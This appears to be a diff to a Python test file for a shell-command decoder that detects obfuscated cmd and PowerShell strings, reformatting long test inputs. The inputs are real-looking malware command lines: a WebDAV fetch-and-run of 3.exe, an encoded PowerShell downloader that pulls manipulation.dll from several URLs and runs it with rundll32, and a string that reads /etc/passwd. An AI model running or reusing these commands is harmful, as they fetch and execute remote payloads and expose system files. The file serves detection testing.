@@ -1,5 +1,6 @@
 import pytest
 import regex as re
+
 from multidecoder.decoders.shell import (
     CMD_RE,
     find_cmd_strings,
@@ -95,11 +96,19 @@ def test_find_cmd_strings_with_combo_of_ps1_and_cmd():
 
 # From c8004f944055296f2636a64f8a469b9db6c9e983305f83ddc50c0617950d2271
 def test_find_cmd_strings_with_dynamic_cmd():
-    ex = b'"C:\\WINDOWS\\system32\\cmd.exe" /c "net use Q: https://webdav.4shared.com dE}9tBDaFK\'Y%%uv /user:lasex69621@cohodl.com & type \\\\webdav.4shared.com@SSL\\aa\\3.exe > 3.exe & forfiles /p c:\\windows\\system32 /m notepad.exe /c %%cd%%/3.exe  & net use * /d /y"'
+    ex = (
+        b'"C:\\WINDOWS\\system32\\cmd.exe" /c "net use Q: https://webdav.4shared.com dE}9tBDaFK\'Y%%uv '
+        b"/user:lasex69621@cohodl.com & type \\\\webdav.4shared.com@SSL\\aa\\3.exe > 3.exe & forfiles /p "
+        b'c:\\windows\\system32 /m notepad.exe /c %%cd%%/3.exe  & net use * /d /y"'
+    )
     assert find_cmd_strings(ex) == [
         Node(
             type_="shell.cmd",
-            value=b'cmd.exe /c "net use Q: https://webdav.4shared.com dE}9tBDaFK\'Y%%uv /user:lasex69621@cohodl.com & type \\\\webdav.4shared.com@SSL\\aa\\3.exe > 3.exe & forfiles /p c:\\windows\\system32 /m notepad.exe /c %%cd%%/3.exe & net use * /d /y"',
+            value=(
+                b"cmd.exe /c \"net use Q: https://webdav.4shared.com dE}9tBDaFK'Y%%uv /user:lasex69621@cohodl.com & "
+                b"type \\\\webdav.4shared.com@SSL\\aa\\3.exe > 3.exe & forfiles /p c:\\windows\\system32 /m "
+                b'notepad.exe /c %%cd%%/3.exe & net use * /d /y"'
+            ),
             start=21,
             end=250,
         )
@@ -172,12 +181,37 @@ def test_find_powershell_strings_invoke_expression():
 
 
 def test_find_powershell_strings_from_dynamic_command():
-    ex = b'"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe" -encodedcommand "UwB0AGEAcgB0AC0AUwBsAGUAZQBwACAALQBTAGUAYwBvAG4AZABzACAANAA7ACQAUABvAGwAeQBuAG8AbQBpAGEAbABpAHMAdABBAG4AZwBsAGkAYwBpAHoAZQBzACAAPQAgACgAIgBoAHQAdABwAHMAOgAvAC8AZQBkAHMAZQBuAGUAegBhAGwAdQBtAGkAbgB1AG0ALgBjAG8AbQAvAE8AUABHAC8ANABhAFQAOAB2AHcALABoAHQAdABwAHMAOgAvAC8AeQBlAGwAbABvAHcAaABhAHQAZwBsAG8AYgBhAGwALgBjAG8AbQAvAEcAMQBSAFcALwBpAGsAdgBvAHEAbQBpADcASgBzAGwALABoAHQAdABwAHMAOgAvAC8AYQB3AGEAaQBzAGQAYQBuAGkAcwBoAC4AYwBvAG0ALwBOAG4AUgBVAC8AaABwAHQAUwBKAHYALABoAHQAdABwAHMAOgAvAC8AYQB2AGEAaQBsAGEAYgBsAGUAYwBsAGUAYQBuAGUAcgAuAGMAbwBtAC8AdwBoAGcAaQBvAC8ASgBmAHEAeABiAFoAdwBQADEAWQBEACwAaAB0AHQAcABzADoALwAvAGUAbgBnAHYAaQBkAGEALgBjAG8AbQAuAGIAcgAvAHIATABtAC8AYwBmAEsAeQBIAEoAeQB2AGgAMgAsAGgAdAB0AHAAcwA6AC8ALwB1AGIAbQBoAGEAaQB0AGkALgBvAHIAZwAvAHQAaABRADYATAAvAG8ARgBMAE8AZQBqAEoAcgBHACIAKQAuAHMAcABsAGkAdAAoACIALAAiACkAOwBmAG8AcgBlAGEAYwBoACAAKAAkAHQAYQB1AHQAbwBsAG8AZwBpAHoAZQBkACAAaQBuACAAJABQAG8AbAB5AG4AbwBtAGkAYQBsAGkAcwB0AEEAbgBnAGwAaQBjAGkAegBlAHMAKQAgAHsAdAByAHkAIAB7AEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgACQAdABhAHUAdABvAGwAbwBnAGkAegBlAGQAIAAtAFQAaQBtAGUAbwB1AHQAUwBlAGMAIAAxADgAIAAtAE8AIAAkAGUAbgB2ADoAVABFAE0AUABcAG0AYQBuAGkAcAB1AGwAYQB0AGkAbwBuAC4AZABsAGwAOwBpAGYAIAAoACgARwBlAHQALQBJAHQAZQBtACAAJABlAG4AdgA6AFQARQBNAFAAXABtAGEAbgBpAHAAdQBsAGEAdABpAG8AbgAuAGQAbABsACkALgBsAGUAbgBnAHQAaAAgAC0AZwBlACAAMQAwADAAMAAwADAAKQAgAHsAcwB0AGEAcgB0ACAAcgB1AG4AZABsAGwAMwAyACAAJABlAG4AdgA6AFQARQBNAFAAXABcAG0AYQBuAGkAcAB1AGwAYQB0AGkAbwBuAC4AZABsAGwALABHAEwANwAwADsAYgByAGUAYQBrADsAfQB9AGMAYQB0AGMAaAAgAHsAUwB0AGEAcgB0AC0AUwBsAGUAZQBwACAALQBTAGUAYwBvAG4AZABzACAANAA7AH0AfQA="'
-
+    ex = (
+        b'"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe" -encodedcommand '
+        b'"UwB0AGEAcgB0AC0AUwBsAGUAZQBwACAALQBTAGUAYwBvAG4AZABzACAANAA7ACQAUABvAGwAeQBuAG8AbQBpAGEAbABpAHMAdABBAG4AZwB'
+        b"sAGkAYwBpAHoAZQBzACAAPQAgACgAIgBoAHQAdABwAHMAOgAvAC8AZQBkAHMAZQBuAGUAegBhAGwAdQBtAGkAbgB1AG0ALgBjAG8AbQAvAE8"
+        b"AUABHAC8ANABhAFQAOAB2AHcALABoAHQAdABwAHMAOgAvAC8AeQBlAGwAbABvAHcAaABhAHQAZwBsAG8AYgBhAGwALgBjAG8AbQAvAEcAMQB"
+        b"SAFcALwBpAGsAdgBvAHEAbQBpADcASgBzAGwALABoAHQAdABwAHMAOgAvAC8AYQB3AGEAaQBzAGQAYQBuAGkAcwBoAC4AYwBvAG0ALwBOAG4"
+        b"AUgBVAC8AaABwAHQAUwBKAHYALABoAHQAdABwAHMAOgAvAC8AYQB2AGEAaQBsAGEAYgBsAGUAYwBsAGUAYQBuAGUAcgAuAGMAbwBtAC8AdwB"
+        b"oAGcAaQBvAC8ASgBmAHEAeABiAFoAdwBQADEAWQBEACwAaAB0AHQAcABzADoALwAvAGUAbgBnAHYAaQBkAGEALgBjAG8AbQAuAGIAcgAvAHI"
+        b"ATABtAC8AYwBmAEsAeQBIAEoAeQB2AGgAMgAsAGgAdAB0AHAAcwA6AC8ALwB1AGIAbQBoAGEAaQB0AGkALgBvAHIAZwAvAHQAaABRADYATAA"
+        b"vAG8ARgBMAE8AZQBqAEoAcgBHACIAKQAuAHMAcABsAGkAdAAoACIALAAiACkAOwBmAG8AcgBlAGEAYwBoACAAKAAkAHQAYQB1AHQAbwBsAG8"
+        b"AZwBpAHoAZQBkACAAaQBuACAAJABQAG8AbAB5AG4AbwBtAGkAYQBsAGkAcwB0AEEAbgBnAGwAaQBjAGkAegBlAHMAKQAgAHsAdAByAHkAIAB"
+        b"7AEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgACQAdABhAHUAdABvAGwAbwBnAGkAegBlAGQAIAAtAFQAaQBtAGUAbwB1AHQ"
+        b"AUwBlAGMAIAAxADgAIAAtAE8AIAAkAGUAbgB2ADoAVABFAE0AUABcAG0AYQBuAGkAcAB1AGwAYQB0AGkAbwBuAC4AZABsAGwAOwBpAGYAIAA"
+        b"oACgARwBlAHQALQBJAHQAZQBtACAAJABlAG4AdgA6AFQARQBNAFAAXABtAGEAbgBpAHAAdQBsAGEAdABpAG8AbgAuAGQAbABsACkALgBsAGU"
+        b"AbgBnAHQAaAAgAC0AZwBlACAAMQAwADAAMAAwADAAKQAgAHsAcwB0AGEAcgB0ACAAcgB1AG4AZABsAGwAMwAyACAAJABlAG4AdgA6AFQARQB"
+        b"NAFAAXABcAG0AYQBuAGkAcAB1AGwAYQB0AGkAbwBuAC4AZABsAGwALABHAEwANwAwADsAYgByAGUAYQBrADsAfQB9AGMAYQB0AGMAaAAgAHs"
+        b'AUwB0AGEAcgB0AC0AUwBsAGUAZQBwACAALQBTAGUAYwBvAG4AZABzACAANAA7AH0AfQA="'
+    )
     assert find_powershell_strings(ex) == [
         Node(
             type_="shell.powershell",
-            value=b'powershell.exe -Command Start-Sleep -Seconds 4;$PolynomialistAnglicizes = ("https://edsenezaluminum.com/OPG/4aT8vw,https://yellowhatglobal.com/G1RW/ikvoqmi7Jsl,https://awaisdanish.com/NnRU/hptSJv,https://availablecleaner.com/whgio/JfqxbZwP1YD,https://engvida.com.br/rLm/cfKyHJyvh2,https://ubmhaiti.org/thQ6L/oFLOejJrG").split(",");foreach ($tautologized in $PolynomialistAnglicizes) {try {Invoke-WebRequest $tautologized -TimeoutSec 18 -O $env:TEMP\\manipulation.dll;if ((Get-Item $env:TEMP\\manipulation.dll).length -ge 100000) {start rundll32 $env:TEMP\\\\manipulation.dll,GL70;break;}}catch {Start-Sleep -Seconds 4;}}',
+            value=(
+                b"powershell.exe -Command Start-Sleep -Seconds 4;$PolynomialistAnglicizes = "
+                b'("https://edsenezaluminum.com/OPG/4aT8vw,https://yellowhatglobal.com/G1RW/ikvoqmi7Jsl,'
+                b"https://awaisdanish.com/NnRU/hptSJv,https://availablecleaner.com/whgio/JfqxbZwP1YD,"
+                b'https://engvida.com.br/rLm/cfKyHJyvh2,https://ubmhaiti.org/thQ6L/oFLOejJrG").split(",");'
+                b"foreach ($tautologized in $PolynomialistAnglicizes) {try {Invoke-WebRequest $tautologized "
+                b"-TimeoutSec 18 -O $env:TEMP\\manipulation.dll;if ((Get-Item $env:TEMP\\manipulation.dll).length "
+                b"-ge 100000) {start rundll32 $env:TEMP\\\\manipulation.dll,GL70;break;}}"
+                b"catch {Start-Sleep -Seconds 4;}}"
+            ),
             obfuscation="powershell.base64",
             start=44,
             end=1658,
@@ -190,7 +224,10 @@ def test_find_powershell_strings_with_combo_of_ps1_and_cmd():
     assert find_powershell_strings(ex) == [
         Node(
             type_="shell.powershell",
-            value=b"powershell -Command curl blah.com && cmd /c curl https://abc.org && powershell -Command cat /etc/passwd",
+            value=(
+                b"powershell -Command curl blah.com && cmd /c curl https://abc.org && "
+                b"powershell -Command cat /etc/passwd"
+            ),
             start=0,
             end=103,
         ),
